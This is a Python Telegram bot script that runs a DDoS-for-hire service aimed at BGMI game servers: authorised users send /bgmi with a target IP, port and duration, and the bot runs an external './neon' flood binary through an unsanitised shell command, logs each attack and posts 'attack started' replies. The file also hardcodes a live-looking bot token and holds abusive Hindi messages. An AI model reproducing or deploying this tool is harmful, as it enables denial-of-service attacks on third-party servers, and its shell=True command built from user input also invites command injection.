#!/usr/bin/python3

import telebot
import subprocess
import requests
import datetime
import os

# insert your Telegram bot token here
bot = telebot.TeleBot('7819992909:AAHn51FAfPId42gmKUT5wPmCoyC4_g9OeN0')

# Admin user IDs
admin_id = ["", "", "", "1662672529"]

# File to store allowed user IDs
USER_FILE = "users.txt"

# File to store command logs
LOG_FILE = "log.txt"


# Function to read user IDs from the file
def read_users():
    try:
        with open(USER_FILE, "r") as file:
            return file.read().splitlines()
    except FileNotFoundError:
        return []

# Function to read free user IDs and their credits from the file
def read_free_users():
    try:
        with open(FREE_USER_FILE, "r") as file:
            lines = file.read().splitlines()
            for line in lines:
                if line.strip():  # Check if line is not empty
                    user_info = line.split()
                    if len(user_info) == 2:
                        user_id, credits = user_info
                        free_user_credits[user_id] = int(credits)
                    else:
                        print(f"Ignoring invalid line in free user file: {line}")
    except FileNotFoundError:
        pass


# List to store allowed user IDs
allowed_user_ids = read_users()

# Function to log command to the file
def log_command(user_id, target, port, time):
    user_info = bot.get_chat(user_id)
    if user_info.username:
        username = "@" + user_info.username
    else:
        username = f"UserID: {user_id}"
    
    with open(LOG_FILE, "a") as file:  # Open in "append" mode
        file.write(f"Username: {username}\nTarget: {target}\nPort: {port}\nTime: {time}\n\n")


# Function to clear logs
def clear_logs():
    try:
        with open(LOG_FILE, "r+") as file:
            if file.read() == "":
                response = "🄻🄾🄶🅂 🄰🄻🅁🄴🄳🅈 🄲🄻🄴🄰🅁🄳."
            else:
                file.truncate(0)
                response = "🄻🄾🄶🅂 🄲🄻🄴🄰🅁🄳 🅂🅄🄲🄲🄴🅂🅂🄵🅄🄻🄻🅈 ✅"
    except FileNotFoundError:
        response = "🄽🄾 🄻🄾🄶🅂 🄲🄻🄴🄰🅁 🄵🄾🅄🄽🄳."
    return response

# Function to record command logs
def record_command_logs(user_id, command, target=None, port=None, time=None):
    log_entry = f"UserID: {user_id} | Time: {datetime.datetime.now()} | Command: {command}"
    if target:
        log_entry += f" | 🅣︎🅐︎🅡︎🅖︎🅔︎🅣︎: {target}"
    if port:
        log_entry += f" | 🅟︎🅞︎🅡︎🅣︎: {port}"
    if time:
        log_entry += f" | 🅓︎🅤︎🅡︎🅐︎🅣︎🅞︎🅘︎🅝︎: {time}"
    
    with open(LOG_FILE, "a") as file:
        file.write(log_entry + "\n")

@bot.message_handler(commands=['add'])
def add_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split()
        if len(command) > 1:
            user_to_add = command[1]
            if user_to_add not in allowed_user_ids:
                allowed_user_ids.append(user_to_add)
                with open(USER_FILE, "a") as file:
                    file.write(f"{user_to_add}\n")
                response = f"User {user_to_add} 🄰🄳🄳 🅂🅄🄲🄲🄴🅂🅂🄵🅄🄻🄻🅈."
            else:
                response = "🅄🅂🄴🅁 🄰🄻🅁🄴🄳🅈 🄴🅇🄸🅂🅃."
        else:
            response = "🄿🄻🄴🄰🅂🄴 🅄🅂🄴 🅁🄸🄶🄷🅃 🄰🄳🄳 🄲🄾🄼🄼🄰🄽🄳."
    else:
        response = "🄾🄽🄻🅈 🄰🄳🄼🄸🄽 🄲🄰🄽 🅁🅄🄽 🅃🄷🄸🅂 🄲🄾🄼🄼🄰🄽🄳 ❌."

    bot.reply_to(message, response)



@bot.message_handler(commands=['remove'])
def remove_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split()
        if len(command) > 1:
            user_to_remove = command[1]
            if user_to_remove in allowed_user_ids:
                allowed_user_ids.remove(user_to_remove)
                with open(USER_FILE, "w") as file:
                    for user_id in allowed_user_ids:
                        file.write(f"{user_id}\n")
                response = f"User {user_to_remove} 🅁🄴🄼🄾🅅🄴🄳 🅂🅄🄲🄲🄴🅂🅂🄵🅄🄻🄻🅈✅."
            else:
                response = f"User {user_to_remove} 🄽🄾🅃 🄵🄾🅄🄽🄳 🄸🄽 🅃🄷🄴 🄻🄸🅂🅃 ❌."
        else:
            response = '''🄿🄻🄴🄰🅂🄴 🅄🅂🄴 🅁🄸🄶🄷🅃 🄲🄾🄼🄼🄰🄽🄳 🅃🄾 🅁🄴🄼🄾🅅🄴. 
✅ Usage: /remove <userid>'''
    else:
        response = "🄾🄽🄻🅈 🄰🄳🄼🄸🄽 🄲🄰🄽 🅁🅄🄽 🅃🄷🄸🅂 🄲🄾🄼🄼🄰🄽🄳."

    bot.reply_to(message, response)


@bot.message_handler(commands=['clearlogs'])
def clear_logs_command(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        try:
            with open(LOG_FILE, "r+") as file:
                log_content = file.read()
                if log_content.strip() == "":
                    response = "🄻🄾🄶🅂 🄰🄻🅁🄴🄳🅈 🄲🄻🄴🄰🅁🄳  ❌."
                else:
                    file.truncate(0)
                    response = "🄻🄾🄶🅂 🄲🄻🄴🄰🅁 🅂🅄🄲🄲🄴🅂🅂🄵🅄🄻🄻🅈 ✅"
        except FileNotFoundError:
            response = "🄻🄾🄶🅂 🄰🄻🅁🄴🄳🅈 🄲🄻🄴🄰🅁🄳 ❌."
    else:
        response = "🄾🄽🄻🅈 🄰🄳🄼🄸🄽 🄲🄰🄽 🅁🅄🄽 🅃🄷🄸🅂 🄲🄾🄼🄼🄰🄽🄳."
    bot.reply_to(message, response)

 

@bot.message_handler(commands=['allusers'])
def show_all_users(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        try:
            with open(USER_FILE, "r") as file:
                user_ids = file.read().splitlines()
                if user_ids:
                    response = "Authorized Users:\n"
                    for user_id in user_ids:
                        try:
                            user_info = bot.get_chat(int(user_id))
                            username = user_info.username
                            response += f"- @{username} (ID: {user_id})\n"
                        except Exception as e:
                            response += f"- User ID: {user_id}\n"
                else:
                    response = "🄽🄾 🄳🄰🅃🄰 🄵🄾🅄🄽🄳 ❌"
        except FileNotFoundError:
            response = "🄽🄾 🄳🄰🅃🄰 🄵🄾🅄🄽🄳 ❌"
    else:
        response = "🄾🄽🄻🅈 🄰🄳🄼🄸🄽 🄲🄰🄽 🅁🅄🄽 🅃🄷🄸🅂 🄲🄾🄼🄼🄰🄽🄳."
    bot.reply_to(message, response)


@bot.message_handler(commands=['logs'])
def show_recent_logs(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        if os.path.exists(LOG_FILE) and os.stat(LOG_FILE).st_size > 0:
            try:
                with open(LOG_FILE, "rb") as file:
                    bot.send_document(message.chat.id, file)
            except FileNotFoundError:
                response = "🄽🄾 🄳🄰🅃🄰 🄵🄾🅄🄽🄳 ❌."
                bot.reply_to(message, response)
        else:
            response = "🄽🄾 🄳🄰🅃🄰 🄵🄾🅄🄽🄳 ❌"
            bot.reply_to(message, response)
    else:
        response = "🄾🄽🄻🅈 🄰🄳🄼🄸🄽 🄲🄰🄽 🅁🅄🄽 🅃🄷🄸🅂 🄲🄾🄼🄼🄰🄽🄳."
        bot.reply_to(message, response)


@bot.message_handler(commands=['id'])
def show_user_id(message):
    user_id = str(message.chat.id)
    response = f"🤖Your ID: {user_id}"
    bot.reply_to(message, response)

# Function to handle the reply when free users run the /bgmi command
def start_attack_reply(message, target, port, time):
    user_info = message.from_user
    username = user_info.username if user_info.username else user_info.first_name
    
    response = f"{username}, 🅐︎🅣︎🅣︎🅐︎🅒︎🅚︎ 🅢︎🅣︎🅐︎🅡︎🅣︎🅔︎🅓︎.\n\n🅣︎🅐︎🅡︎🅖︎🅔︎🅣︎: {target}\n🅟︎🅞︎🅡︎🅣︎: {port}\n🅓︎🅤︎🅡︎🅐︎🅣︎🅞︎🅘︎🅝︎: {time} 🅢︎🅔︎🅒︎🅞︎🅝︎🅓︎🅢︎\n🄹🄾🄸🄽: https://t.me/+03wLVBPurPk2NWRl"
    bot.reply_to(message, response)

# Dictionary to store the last time each user ran the /bgmi command
bgmi_cooldown = {}

COOLDOWN_TIME =0

# Handler for /bgmi command
@bot.message_handler(commands=['bgmi'])
def handle_bgmi(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids:
        # Check if the user is in admin_id (admins have no cooldown)
        if user_id not in admin_id:
            # Check if the user has run the command before and is still within the cooldown period
            if user_id in bgmi_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds < 0:
                response = "🅆🄰🄸🅃 🄲🄾🄾🄻🄳🄾🅆🄽 ❌. /bgmi Command Again."
                bot.reply_to(message, response)
                return
            # Update the last time the user ran the command
            bgmi_cooldown[user_id] = datetime.datetime.now()
        
        command = message.text.split()
        if len(command) == 4:  # Updated to accept target, time, and port
            target = command[1]
            port = int(command[2])  # Convert time to integer
            time = int(command[3])  # Convert port to integer
            if time > 241:
                response = "Error: Time interval must be less than 240."
            else:
                record_command_logs(user_id, '/bgmi', target, port, time)
                log_command(user_id, target, port, time)
                start_attack_reply(message, target, port, time)  # Call start_attack_reply function
                full_command = f"./neon {target} {port} {time} 600"
                subprocess.run(full_command, shell=True)
                response = f"🅐︎🅣︎🅣︎🅐︎🅒︎🅚︎ 🅕︎🅘︎🅝︎🅘︎🅢︎🅗︎🅔︎🅓︎. 🅣︎🅐︎🅡︎🅖︎🅔︎🅣︎: {target} 🅟︎🅞︎🅡︎🅣︎: {port} 🅓🅤︎🅡︎🅐︎🅣︎🅞︎🅘︎🅝︎: {time}"
        else:
            response = "✅ Usage :- /bgmi <target> <port> <time>"  # Updated command syntax
    else:
        response = "❌ 🅈🄾🅄 🄰🅁🄴 🄽🄾🅃 🄰🄾🅄🅃🄷🄾🅁🄸🅉🄴🄳."

    bot.reply_to(message, response)



# Add /mylogs command to display logs recorded for bgmi and website commands
@bot.message_handler(commands=['mylogs'])
def show_command_logs(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids:
        try:
            with open(LOG_FILE, "r") as file:
                command_logs = file.readlines()
                user_logs = [log for log in command_logs if f"UserID: {user_id}" in log]
                if user_logs:
                    response = "Your Command Logs:\n" + "".join(user_logs)
                else:
                    response = "❌  🄽🄾 🄻🄾🄶🅂 🄲🄾🄼🄼🄰🄽🄳 🄵🄾🅄🄽🄳."
        except FileNotFoundError:
            response = "No command logs found."
    else:
        response = "❌ 🅈🄾🅄 🄰🅁🄴 🄽🄾🅃 🄰🄾🅄🅃🄷🄾🅁🄸🅉🄴🄳."

    bot.reply_to(message, response)


@bot.message_handler(commands=['help'])
def show_help(message):
    help_text ='''🅒︎🅞︎🅜︎🅜︎🅐︎🅝︎🅓︎🅢︎:
💥 /bgmi : 🅤︎🅢︎🅔︎ 🅕︎🅞︎🅡︎ 🅐︎🅣︎🅣︎🅐︎🅒︎🅚︎. 
💥 /rules : 🅡︎🅤︎🅛︎🅔︎🅢︎︎ 🅒︎🅗︎🅔︎🅒︎🅚︎ 🅚︎🅞︎🅡︎🅞︎.
💥 /mylogs : 🅒︎🅗︎🅔︎🅒︎🅚︎ 🅡︎🅔︎🅢︎🅔︎🅝︎🅣︎ 🅐︎🅣︎🅣︎🅐︎🅒︎🅚︎🅢︎.
💥 /plan : 🅟︎🅛︎🅐︎🅝︎🅔︎ 🅒︎🅗︎🅔︎🅒︎🅚︎ 🅚︎🅐︎🅡︎🅞︎.

 🅰︎🅳︎🅼︎🅸︎🅽︎ 🅲︎🅾︎🅼︎🅼︎🅰︎🅽︎🅳︎:
💥 /admincmd : 🅒︎🅞︎🅜︎🅜︎🅐︎🅝︎🅓︎🅢︎.


'''
    for handler in bot.message_handlers:
        if hasattr(handler, 'commands'):
            if message.text.startswith('/help'):
                help_text += f"{handler.commands[0]}: {handler.doc}\n"
            elif handler.doc and 'admin' in handler.doc.lower():
                continue
            else:
                help_text += f"{handler.commands[0]}: {handler.doc}\n"
    bot.reply_to(message, help_text)

@bot.message_handler(commands=['start'])
def welcome_start(message):
    user_name = message.from_user.first_name
    response = f'''🇼 🇪 🇱 🇨 🇴 🇲 🇪  🇹 🇴  🇬 🇴 🇩X 🇨 🇭 🇪 🇦 🇹 🇸 , {user_name}! hello.
𝙩𝙧𝙮 𝙩𝙤 𝙩𝙝𝙞𝙨 𝙘𝙤𝙢𝙢𝙖𝙣𝙙 : /help 
𝙙𝙢 𝙩𝙤 𝙤𝙬𝙣𝙣𝙚𝙧 - @GODxAloneBOY'''
    bot.reply_to(message, response)

@bot.message_handler(commands=['rules'])
def welcome_rules(message):
    user_name = message.from_user.first_name
    response = f'''{user_name} 𝙧𝙪𝙡𝙚𝙨 𝙙𝙚𝙠𝙝 𝙡𝙖𝙪𝙙𝙚  ⚠️:
 ⠀⠀⠀⠀██████ ]▄▄▄▄▄▄▄
▂▅████████▅▃▂   ☻
Il████████████]. / ▌\╦─  
@@@@@@@@@@@@@@    /  \


'''
    bot.reply_to(message, response)

@bot.message_handler(commands=['plan'])
def welcome_plan(message):
    user_name = message.from_user.first_name
    response = f'''{user_name}, 𝙩𝙪 𝙟𝙖 𝙗𝙚 𝙡𝙖𝙪𝙙𝙚:

𝙣𝙤 𝙥𝙡𝙖𝙣𝙨 :
 ⠛⠛⣿⣿⣿⣿⣿⡷⢶⣦⣶⣶⣤⣤⣤⣀⠀⠀⠀
 ⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡀⠀
 ⠀⠀⠀⠉⠉⠉⠙⠻⣿⣿⠿⠿⠛⠛⠛⠻⣿⣿⣇⠀
 ⠀⠀⢤⣀⣀⣀⠀⠀⢸⣷⡄⠀⣁⣀⣤⣴⣿⣿⣿⣆
 ⠀⠀⠀⠀⠹⠏⠀⠀⠀⣿⣧⠀⠹⣿⣿⣿⣿⣿⡿⣿
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠛⠿⠇⢀⣼⣿⣿⠛⢯⡿⡟
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠦⠴⢿⢿⣿⡿⠷⠀⣿⠀
 ⠀⠀⠀⠀⠀⠀⠀⠙⣷⣶⣶⣤⣤⣤⣤⣤⣶⣦⠃⠀
 ⠀⠀⠀⠀⠀⠀⠀⢐⣿⣾⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀
 ⠀⠀⠀⠀⠀⠀⠀⠈⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠻⢿⣿⣿⣿⣿⠟⠁

'''
    bot.reply_to(message, response)

@bot.message_handler(commands=['admincmd'])
def welcome_plan(message):
    user_name = message.from_user.first_name
    response = f'''{user_name}, Admin Commands Are Here!!:

💥 /add <userId> : Add a User.
💥 /remove <userid> Remove a User.
💥 /allusers : Authorised Users Lists.
💥 /logs : All Users Logs.
💥 /broadcast : Broadcast a Message.
💥 /clearlogs : Clear The Logs File.
❤️ /info: public source.
'''
    bot.reply_to(message, response)


@bot.message_handler(commands=['broadcast'])
def broadcast_message(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split(maxsplit=1)
        if len(command) > 1:
            message_to_broadcast = "⚠️ Message To All Users By Admin:\n\n" + command[1]
            with open(USER_FILE, "r") as file:
                user_ids = file.read().splitlines()
                for user_id in user_ids:
                    try:
                        bot.send_message(user_id, message_to_broadcast)
                    except Exception as e:
                        print(f"Failed to send broadcast message to user {user_id}: {str(e)}")
            response = "Broadcast Message Sent Successfully To All Users 👍."
        else:
            response = "🤖 Please Provide A Message To Broadcast."
    else:
        response = "Only Admin Can Run This Command 😡."

    bot.reply_to(message, response)




bot.polling()
